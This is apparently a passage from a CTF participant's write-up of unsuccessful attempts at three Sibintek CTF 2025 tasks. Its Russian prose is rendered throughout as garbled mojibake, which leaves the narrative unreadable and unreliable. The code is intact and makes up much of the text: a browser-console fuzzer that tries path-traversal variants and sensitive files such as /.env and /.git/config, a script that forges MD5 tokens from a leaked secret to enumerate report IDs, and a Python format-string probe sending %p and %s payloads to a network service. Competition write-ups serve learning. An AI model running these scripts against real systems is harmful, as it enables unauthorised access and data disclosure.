[–°–∏–±–∏–Ω—Ç–µ–∫](https://team.sibctf2025.ru/)

![](img/5/1.png)

–ü—Ä–æ–±–æ–≤–∞–ª–∞ —Ä–∞–∑–Ω—ã–µ –∑–∞–¥–∞—á–∏, –Ω–∏ –æ–¥–Ω–∞ –Ω–µ –ø–æ–ª—É—á–∏–ª–∞—Å—å, –Ω–∏–∂–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ –ø–æ–ø—ã—Ç–æ–∫.

---

***–í—ã—Å–æ–∫–æ—á–∞—Å—Ç–æ—Ç–Ω—ã–π –∞–Ω–∞–ª–∏–∑***
---

–í–Ω—É—á–∫–∞ –≥–µ–Ω–µ—Ä–∞–ª—å–Ω–æ–≥–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∞ –î–ù–ö —Å –º–ª–∞–¥–µ–Ω—á–µ—Å—Ç–≤–∞ —Å–ª—É—à–∞–ª–∞ —Ä–∞–∑–≥–æ–≤–æ—Ä—ã —Å—Ç–∞—Ä—à–∏—Ö –ø—Ä–æ –Ω–µ—Ñ—Ç—å, –Ω–µ—Ñ—Ç–µ–ø—Ä–æ–¥—É–∫—Ç—ã –∏ –≤—Å—ë —Ç–∞–∫–æ–µ –ø—Ä–æ—á–µ–µ. –î–µ–≤–æ—á–∫–∞ –≤ —à–∫–æ–ª–µ –æ—á–µ–Ω—å —Ö–æ—Ä–æ—à–æ —É—á–∏—Ç—Å—è, —Å–æ–±–∏—Ä–∞–µ—Ç—Å—è –ø–æ—Å—Ç—É–ø–∞—Ç—å –≤ "–ö–µ—Ä–æ—Å–∏–Ω–∫—É", —É–º–Ω–∏—á–∫–∞ –ø—Ä–æ—Å—Ç–æ, —Ö–æ—Ç—è –æ–Ω–∞ –∏ –ø—Ä–æ–∫–∞–∑–Ω–∏—Ü–∞. 

–ö–æ–≥–¥–∞ –æ–Ω–∞ —É–∑–Ω–∞–ª–∞, —á—Ç–æ –¥–µ–¥—É—à–∫–∞, –Ω–∞–∫–æ–Ω–µ—Ü-—Ç–æ, —Å–æ–≥–ª–∞—Å–∏–ª—Å—è –ø–µ—Ä–µ—Å–µ—Å—Ç—å —Å–æ —Å–≤–æ–µ–π —Ä–∞—Ä–∏—Ç–µ—Ç–Ω–æ–π "–í–æ–ª–≥–∏" –Ω–∞ –Ω–æ—Ä–º–∞–ª—å–Ω—ã–π, —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π —Å–µ–¥–∞–Ω –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª—å—Å–∫–æ–≥–æ –∫–ª–∞—Å—Å–∞ - –æ–Ω–∞ –ø—Ä–∏—Å–ª–∞–ª–∞ –µ–º—É —Å–æ–æ–±—â–µ–Ω–∏–µ: "–î–µ–¥—É–ª—è, –Ω–µ –∑–∞–±—É–¥—å –¥–æ–±–∞–≤–∏—Ç—å –≤–æ—Ç —ç—Ç–æ" - –∏ –ø—Ä–∏–ª–æ–∂–∏–ª–∞ –∫–∞—Ä—Ç–∏–Ω–∫—É.

–ö –∑–∞–¥–∞—á–µ –ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–æ —Ñ–æ—Ç–æ:

![](img/5/2.png)

–ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ —ç—Ç–æ –ê–∑–±—É–∫–∞ –ú–æ—Ä–∑–µ:

‚≠ê = –¥–ª–∏–Ω–Ω—ã–π —Å–∏–≥–Ω–∞–ª,

üíô = –∫–æ—Ä–æ—Ç–∫–∏–π —Å–∏–≥–Ω–∞–ª,

‚òÅ = —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å.

–ù–∞–∑–≤–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ ¬´–í—ã—Å–æ–∫–æ—á–∞—Å—Ç–æ—Ç–Ω—ã–π –∞–Ω–∞–ª–∏–∑¬ª –Ω–∞–º–µ–∫–∞–µ—Ç –Ω–∞ —á–∞—Å—Ç–æ—Ç–Ω—ã–π –∞–Ω–∞–ª–∏–∑ –∏ —Ç–æ, —á—Ç–æ —á–∞—Å—Ç–æ –≤—Å—Ç—Ä–µ—á–∞—é—â–∞—è—Å—è –±—É–∫–≤–∞ ¬´–ë¬ª –¥–æ–ª–∂–Ω–∞ –∞—Å—Å–æ—Ü–∏–∏—Ä–æ–≤–∞—Ç—å—Å—è —Å —á–µ–º-—Ç–æ –Ω–µ—Ñ—Ç—è–Ω—ã–º: –±–µ–Ω–∑–∏–Ω, –±–µ–Ω–∑–æ–ª, –±—É—Å—Ç–µ—Ä, –ø—Ä–∏—Å–∞–¥–∫–∞ –∏ —Ç.–ø. –î–µ–≤–æ—á–∫–∞ –ø–∏—à–µ—Ç –¥–µ–¥—É, –∫–æ—Ç–æ—Ä—ã–π –ø–µ—Ä–µ—Å–∞–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞ –Ω–æ–≤—ã–π —Å–µ–¥–∞–Ω: ¬´–Ω–µ –∑–∞–±—É–¥—å –¥–æ–±–∞–≤–∏—Ç—å –≤–æ—Ç —ç—Ç–æ¬ª ‚Äî —Ç–æ –µ—Å—Ç—å –Ω–µ –∑–∞–±—É–¥—å –ø—Ä–æ —Ç–æ–ø–ª–∏–≤–æ / –ø—Ä–∏—Å–∞–¥–∫—É / –æ–∫—Ç–∞–Ω–æ–≤–æ–µ —á–∏—Å–ª–æ.

–ü—Ä–æ–±–æ–≤–∞–ª–∞ —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ–ª–∞–≥–∏, –Ω–æ –Ω–µ –æ–¥–∏–Ω –Ω–µ –ø–æ–¥–æ—à–µ–ª, –ø—Ä–∏–º–µ—Ä—ã –Ω–∏–∂–µ:

Sibintek{–¥–æ–±–∞–≤—å-–≤—ã—Å–æ–∫–æ–æ–∫—Ç–∞–Ω–æ–≤—ã–π-–±–µ–Ω–∑–∏–Ω_–¥–µ–¥—É—à–∫–∞}

Sibintek{–ø–æ–¥–Ω–∏–º–∏-–æ–∫—Ç–∞–Ω–æ–≤–æ–µ-—á–∏—Å–ª–æ_–ø—Ä–∏—Å–∞–¥–∫–æ–π}

Sibintek{–∏—Å–ø–æ–ª—å–∑—É–π-—Ç–æ–ø–ª–∏–≤–Ω—É—é-–ø—Ä–∏—Å–∞–¥–∫—É_–ø–æ—Å—Ç–æ—è–Ω–Ω–æ}

Sibintek{–ø–æ–≤—ã—Å—å-–æ–∫—Ç–∞–Ω–æ–≤–æ–µ-—á–∏—Å–ª–æ_–±—É—Å—Ç–µ—Ä–æ–º}

–ü—Ä–æ–±–æ–≤–∞–ª–∞ —Ç–∞–∫–∂–µ –¥—Ä—É–≥—É—é –ª–æ–≥–∏–∫—É:

üíô ‚Äî –∞—Ç–æ–º –≤–æ–¥–æ—Ä–æ–¥–∞ (H),

‚≠ê ‚Äî –∞—Ç–æ–º —É–≥–ª–µ—Ä–æ–¥–∞ (C),

‚òÅ ‚Äî –≥–∞–∑ –∏–ª–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ.

–¢–æ–≥–¥–∞ —Ä—è–¥—ã –∏–∑ —Å–µ—Ä–¥–µ—Ü –∏ –∑–≤—ë–∑–¥ –ø–æ—Ö–æ–∂–∏ –Ω–∞ —É–≥–ª–µ–≤–æ–¥–æ—Ä–æ–¥—ã:

‚≠êüíôüíôüíô ‚Üí CH‚ÇÉ

‚≠êüíôüíô‚≠êüíôüíôüíô‚≠ê ‚Üí —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö CH‚ÇÉ-–≥—Ä—É–ø–ø.

–í–Ω—É—á–∫–∞ –∏–∑ ¬´–ö–µ—Ä–æ—Å–∏–Ω–∫–∏¬ª (–Ω–µ—Ñ—Ç—è–Ω–æ–≥–æ –≤—É–∑–∞) –ø—Ä–∏—Å—ã–ª–∞–µ—Ç —Ñ–æ—Ä–º—É–ª—É —É–≥–ª–µ–≤–æ–¥–æ—Ä–æ–¥–∞ ‚Äî –Ω–∞–º—ë–∫ –Ω–∞ –æ–∫—Ç–∞–Ω (C‚ÇàH‚ÇÅ‚Çà) –∏–ª–∏ –±–µ–Ω–∑–∏–Ω.

–§–ª–∞–≥ –Ω–∏–∂–µ —Ç–∞–∫–∂–µ –Ω–µ –ø–æ–¥–æ—à–µ–ª:

Sibintek{–Ω–µ-–∑–∞–±—É–¥—å-–ø—Ä–æ-–ø—Ä–∏—Å–∞–¥–∫—É_–æ–∫—Ç–∞–Ω–∞}

–¢–∞–∫–∂–µ –ø—Ä–æ–±–æ–≤–∞–ª–∞ –∏–Ω–∞—á–µ. –ù–∞ –∫–∞—Ä—Ç–∏–Ω–∫–µ —è–≤–Ω–æ –ø–æ–∫–∞–∑–∞–Ω–æ —Å–ª–æ–∂–µ–Ω–∏–µ –∏ –≤—ã—á–∏—Ç–∞–Ω–∏–µ. –≠–ª–µ–º–µ–Ω—Ç—ã ‚Äî –∫–∞–∫ –±—É–¥—Ç–æ —Ü–∏—Ñ—Ä—ã –∏–ª–∏ —Å–∏–º–≤–æ–ª—ã. –ú–æ–∂–Ω–æ —Ç—Ä–∞–∫—Ç–æ–≤–∞—Ç—å üíô = 1, ‚≠ê = 0, ‚òÅ = –ø–µ—Ä–µ–Ω–æ—Å (—Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å). –¢–æ–≥–¥–∞ –≤–µ—Ä—Ö–Ω—è—è —á–∞—Å—Ç—å ‚Äì —ç—Ç–æ –±–∏–Ω–∞—Ä–Ω–æ–µ —Å–ª–æ–∂–µ–Ω–∏–µ, –Ω–∏–∂–Ω—è—è ‚Äì —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∏ –≤—ã—á–∏—Ç–∞–Ω–∏–µ. –ü–æ–ª—É—á–∞–µ—Ç—Å—è —á—Ç–æ-—Ç–æ –≤—Ä–æ–¥–µ ¬´0101 + 0110 = 1011¬ª, —Ç–æ –µ—Å—Ç—å –ø–µ—Ä–µ–≤–æ–¥ –≤ –¥–≤–æ–∏—á–Ω–æ–µ.

–ù–æ —Ñ–ª–∞–≥–∏ —Ç–∞–∫–∂–µ –Ω–µ –ø–æ–¥–æ—à–ª–∏:

Sibintek{–ø–µ—Ä–µ–π–¥–∏-–Ω–∞-—Ü–∏—Ñ—Ä–æ–≤–æ–µ_—Ç–æ–ø–ª–∏–≤–æ}

Sibintek{–≤—ã—Å–æ–∫–æ—á–∞—Å—Ç–æ—Ç–Ω—ã–π-–∞–Ω–∞–ª–∏–∑_–≤-–¥–µ–π—Å—Ç–≤–∏–∏}

---

***DNK Delivery***
---

–û–±—ã—á–Ω—ã–µ –ø—É—Ç–∏ –≤–µ–¥—É—Ç –∫ –æ–±—ã—á–Ω—ã–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º. –ß—Ç–æ –µ—Å–ª–∏ –ø–æ–π—Ç–∏ –¥—Ä—É–≥–∏–º –ø—É—Ç—ë–º?

https://dnk-delivery.team.sibctf2025.ru

–ü—Ä–æ–±—É—é –ø–µ—Ä–µ–±—Ä–∞—Ç—å –ø—É—Ç–∏ –∏ –º–µ—Ç–æ–¥—ã —Å–∫—Ä–∏–ø—Ç–æ–º –Ω–∏–∂–µ.

```javascript
(async function(){
  const TARGET_ORIGIN = location.origin;
  const basePath = "";
  const paths = [
    "/", "/index", "/index.html", "/home", "/api", "/api/v1", "/admin", "/admin/login",
    "/login", "/register", "/debug", "/health", "/status", "/.env", "/robots.txt",
    "/sitemap.xml", "/backup", "/.git/config", "/config.php", "/internal", "/server-status",
    "/.htaccess"
  ];
  const transforms = [
    p => p,
    p => p + "/",
    p => "/%2e%2e/" + p.replace(/^\//,''),
    p => p.replace(/\//g,"//"),
    p => p + "%2e%2e%2f",
    p => "/..;/" + p.replace(/^\//,'')
  ];
  const methods = ["GET","HEAD","OPTIONS","POST","TRACE"];

  function short(s, n=200){ return s.replace(/\s+/g,' ').slice(0,n); }

  for(const p of paths){
    for(const tf of transforms){
      const path = tf(p);
      const url = TARGET_ORIGIN.replace(/\/$/,'') + (path.startsWith('/') ? path : '/'+path);
      for(const method of methods){
        try{
          const opts = {
            method,
            credentials: 'include',
            redirect: 'manual'
          };
          if(method === "POST") opts.body = "";
          const r = await fetch(url, opts);
          let type = r.type;
          let status = r.status;
          let len = null;
          let ct = r.headers.get('content-type') || '';
          let snippet = '';
          if(r.type !== 'opaque' && (ct.includes('text') || ct.includes('json') || ct=='')){
            try{
              const text = await r.text();
              len = text.length;
              snippet = short(text, 500);
            }catch(e){
              snippet = "[–Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ç–µ–ª–æ: " + e + "]";
            }
          } else {
            snippet = "[opaque/binary or CORS prevented reading body]";
          }

          if(status !== 404){
            console.groupCollapsed(`${method} ${url} -> ${status} (${type})`);
            console.log("Content-Type:", ct);
            console.log("Length (if available):", len);
            console.log("Snippet:", snippet);
            console.log("Headers:");
            try{
              for(const [k,v] of r.headers.entries()) console.log(k, ":", v);
            }catch(e){}
            console.groupEnd();
          }
        }catch(err){
          console.log(`[ERR] ${method} ${url} -> ${err}`);
        }
        await new Promise(res=>setTimeout(res, 70));
      }
    }
  }
  console.log("Fuzz –∑–∞–≤–µ—Ä—à—ë–Ω.");
})();
```

![](img/5/3.png)

–ù–∞—Ö–æ–∂—É –ø–æ–ª–µ–∑–Ω—ã–µ –ø—É—Ç–∏: /login –∏ /static/js/delivery-utils.js. –¢–µ–ø–µ—Ä—å –ø—Ä–æ–±—É—é –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ delivery-utils.js –∏ main.js.

```javascript
(async ()=>{
  const url = new URL('/static/js/delivery-utils.js', location.origin).toString();
  console.log("Fetching", url);
  try{
    const r = await fetch(url);
    const txt = await r.text();
    console.log("=== delivery-utils.js (–Ω–∞—á–∞–ª–æ) ===\n", txt.slice(0,4000));
    const re = /(?:(?:fetch|axios\.get|axios\.post|axios\(|open\(|xhr\.open)\s*\(?\s*['"`]([^'"]+)['"`])/ig;
    const set = new Set();
    let m;
    while(m = re.exec(txt)) set.add(m[1]);
    console.log("Found candidate paths/URLs:");
    Array.from(set).forEach(x=>console.log(x));
    const re2 = /\/api\/[A-Za-z0-9_\-\/]*/ig;
    const found2 = txt.match(re2) || [];
    if(found2.length) {
      console.log("–ü—Ä—è–º—ã–µ /api/... –≤—Ö–æ–¥—ã:");
      Array.from(new Set(found2)).forEach(x=>console.log(x));
    } else console.log("–ù–µ –Ω–∞–π–¥–µ–Ω–æ —è–≤–Ω—ã—Ö /api/... —Å—Ç—Ä–æ–∫.");
  }catch(e){
    console.error("Error fetching file:", e);
  }
})();
```

–í—ã–ø–æ–ª–Ω—è—é —Å–∫—Ä–∏–ø—Ç, –Ω–æ –Ω–∏—á–µ–≥–æ –Ω–µ –Ω–∞—Ö–æ–∂—É.

![](img/5/4.png)

–ù–∞—à–ª–∞ DELIVERY_SECURITY_KEY –≤ —Å–∫—Ä–∏–ø—Ç–µ.

![](img/5/5.png)

–°–æ–∑–¥–∞–ª–∞ —É—á–µ—Ç–Ω—É—é –∑–∞–ø–∏—Å—å –∏ –≤–æ—à–ª–∞ –ø–æ–¥ –Ω–µ–π –Ω–∞ —Å–∞–π—Ç. –ü—Ä–æ–±–æ–≤–∞–ª–∞ –ø–µ—Ä–µ–±—Ä–∞—Ç—å –¥–∏–∞–ø–∞–∑–æ–Ω reportId, –Ω–æ –Ω–µ –Ω–∞—à–ª–∞ —Ç–µ, –∫–æ—Ç–æ—Ä—ã–µ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç 200.

```javascript
(async ()=> {
  const SECRET = "DNK_MASTER_2025_SECRET";
  const USER_ID = 1;
  const START = 1;
  const END = 200; 
  const CONC = 6;

  if(typeof md5 === 'undefined'){
    await new Promise((res,rej)=>{
      const s = document.createElement('script');
      s.src = 'https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.18.0/js/md5.min.js';
      s.onload = res; s.onerror = rej;
      document.head.appendChild(s);
    });
  }

  const makeUrl = (rid, uid, secret) => {
    const token = md5(String(rid) + secret + String(uid));
    return `${location.origin}/delivery/report?id=${rid}&auth_token=${token}`;
  };

  const jobs = [];
  for(let i=START;i<=END;i++) jobs.push(i);

  const results = [];

  async function worker() {
    while(jobs.length){
      const rid = jobs.shift();
      const url = makeUrl(rid, USER_ID, SECRET);
      try{
        const r = await fetch(url, {method:'GET', credentials:'include', redirect:'manual'});
        if(r.status === 200){
          const text = await r.text();
          console.log("FOUND 200 for reportId=", rid, "URL=", url);
          console.log(text.slice(0,1000));
          results.push({reportId:rid, url, bodySnippet:text.slice(0,1000)});
        } else {
          if(r.status !== 404) console.log(`${rid} -> ${r.status} ${r.type}`);
        }
      }catch(e){
        console.log("ERR", rid, e);
      }
      await new Promise(r=>setTimeout(r, 50));
    }
  }

  const workers = Array.from({length:CONC}).map(()=>worker());
  await Promise.all(workers);
  console.log("Done. Results:", results);
})();
```

![](img/5/6.png)

---

***ORMS DNK***
---

–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Å–æ–æ–±—â–∏–ª –Ω–∞–º, —á—Ç–æ –≤ –Ω–∞—à–µ–π —Å–∏—Å—Ç–µ–º–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å. –ù—É–∂–Ω–æ —Å—Ä–æ—á–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π. 

nc 109.196.167.99 30784

–ö –∑–∞–¥–∞—á–µ –ø—Ä–∏–ª–æ–∂–µ–Ω –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –∏ —Ä–µ–∞–ª—å–Ω—ã–π —Å–µ—Ç–µ–≤–æ–π —Å–µ—Ä–≤–∏—Å.

–ù–ø–∏—Å–∞–ª–∞ –ø—Ä–æ–≥—Ä–∞–º–º—É, –∫–æ—Ç–æ—Ä–∞—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è –∫ —Å–µ—Ä–≤–∏—Å—É host:port, –≤—ã–±–∏—Ä–∞–µ—Ç –ø—É–Ω–∫—Ç –º–µ–Ω—é –∏ –ø—Ä–æ–±—É–µ—Ç –Ω–∞–π—Ç–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—å —Ñ–æ—Ä–º–∞—Ç–Ω–æ–π —Å—Ç—Ä–æ–∫–∏.

```python
import socket, sys, time, re

TIMEOUT = 4.0

def recv_all(sock, timeout=TIMEOUT):
    sock.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if b'Enter input' in data or b'Input' in data:
                break
    except socket.timeout:
        pass
    except Exception:
        pass
    return data

def interact_once(host, port, menu_choice, payload, connect_timeout=4.0):
    try:
        s = socket.create_connection((host, port), timeout=connect_timeout)
    except Exception as e:
        return None, f"[connect error] {e}"
    try:
        data = recv_all(s, timeout=2.0)
        menu_txt = data.decode('utf-8', errors='replace') if data else ''
        try:
            s.sendall((str(menu_choice) + "\\n").encode())
        except Exception as e:
            s.close()
            return None, f"[send menu error] {e}"
        time.sleep(0.12)
        _ = recv_all(s, timeout=1.2)
        try:
            if isinstance(payload, bytes):
                s.sendall(payload)
            else:
                s.sendall(payload.encode(errors='ignore'))
        except Exception as e:
            s.close()
            return None, f"[send payload error] {e}"
        time.sleep(0.18)
        resp = recv_all(s, timeout=1.5)
        try: s.close()
        except: pass
        return resp.decode('utf-8', errors='replace') if resp else "", None
    except Exception as e:
        try: s.close()
        except: pass
        return None, f"[interaction error] {e}"

def try_basic_leak(host, port, menu_choice=3):
    print("[*] Basic %p leak (many pointers in one request)...")
    payload = ("%p." * 60) + "\\n"
    txt, err = interact_once(host, port, menu_choice, payload)
    if err:
        print("[!] basic leak error:", err); return None
    if not txt:
        print("[ ] basic leak: no response"); return None
    snippet = txt.replace("\\n","\\\\n")[:1200]
    print("basic leak snippet:\\n", snippet)
    ptrs = re.findall(r'0x[0-9a-fA-F]{6,16}', txt)
    if ptrs:
        print("[*] pointers found (sample):", ptrs[:30])
    else:
        print("[*] no 0x... pointers found in basic leak")
    mflag = re.search(r'Sibintek\\{[^\\}]{1,200}\\}', txt)
    if mflag:
        print("\\n*** FLAG FOUND:", mflag.group(0)); return mflag.group(0)
    return None

def search_by_index(host, port, menu_choice=3, start=1, end=60):
    print(f"[*] Scanning indexes %p from {start} to {end} (new conn per attempt)...")
    flag_re = re.compile(r'Sibintek\\{[^\\}]{1,200}\\}')
    pointers = []
    for i in range(start, end+1):
        fmt = f"%{i}$p\\n"
        txt, err = interact_once(host, port, menu_choice, fmt)
        if err:
            print(f"[!] Attempt {i}: error -> {err}")
            time.sleep(0.12)
            continue
        if not txt:
            print(f"[ ] {i}: no response")
        else:
            snippet = txt.replace("\\n","\\\\n")[:300]
            print(f"[{i}] %p -> {len(txt)} bytes: {snippet}")
            for m in re.finditer(r'0x[0-9a-fA-F]{6,16}', txt):
                pointers.append(m.group(0))
            mflag = flag_re.search(txt)
            if mflag:
                print("\\n*** FLAG FOUND:", mflag.group(0))
                return mflag.group(0)
        time.sleep(0.06)
    print("Pointer scan complete. Example pointers:", pointers[:40])
    return None

def scan_s_style(host, port, menu_choice=3, start=1, end=60):
    print(f"[*] Scanning %s style from {start} to {end} (attempt to read strings by stack refs)...")
    flag_re = re.compile(r'Sibintek\\{[^\\}]{1,200}\\}')
    for i in range(start, end+1):
        fmt = f"%{i}$s\\n"
        txt, err = interact_once(host, port, menu_choice, fmt)
        if err:
            print(f"[!] {i}$s -> error {err}")
            time.sleep(0.08)
            continue
        if txt:
            snippet = txt.replace("\\n","\\\\n")[:400]
            print(f"[{i}] %s -> {len(txt)} bytes: {snippet}")
            mflag = flag_re.search(txt)
            if mflag:
                print("\\n*** FLAG FOUND:", mflag.group(0))
                return mflag.group(0)
        else:
            print(f"[{i}] %s -> no response")
        time.sleep(0.06)
    return None

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 exploit_orms.py <host> <port> [menu_choice] [start_index] [end_index]")
        return
    host = sys.argv[1]
    port = int(sys.argv[2])
    menu_choice = int(sys.argv[3]) if len(sys.argv) > 3 else 3
    start_idx = int(sys.argv[4]) if len(sys.argv) > 4 else 1
    end_idx = int(sys.argv[5]) if len(sys.argv) > 5 else 60

    print(f"Target: {host}:{port}  menu_choice={menu_choice}  index_range={start_idx}-{end_idx}")
    f = try_basic_leak(host, port, menu_choice)
    if f: return
    f = search_by_index(host, port, menu_choice, start_idx, end_idx)
    if f: return
    f = scan_s_style(host, port, menu_choice, start_idx, end_idx)
    if f: return
    print("All automated attempts done. –ï—Å–ª–∏ —Ñ–ª–∞–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω ‚Äî –ø—Ä–∏—à–ª–∏ —Å—é–¥–∞ –≤—ã–≤–æ–¥—ã (–æ—Å–æ–±–µ–Ω–Ω–æ block basic leak and pointers).")
if __name__ == "__main__":
    main()
```

–ó–∞–ø—É—Å—Ç–∏–ª–∞ –ø—Ä–æ–≥—Ä–∞–º–º—É, –Ω–æ –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–ª—É—á–∏–ª–∞.

![](img/5/7.png)
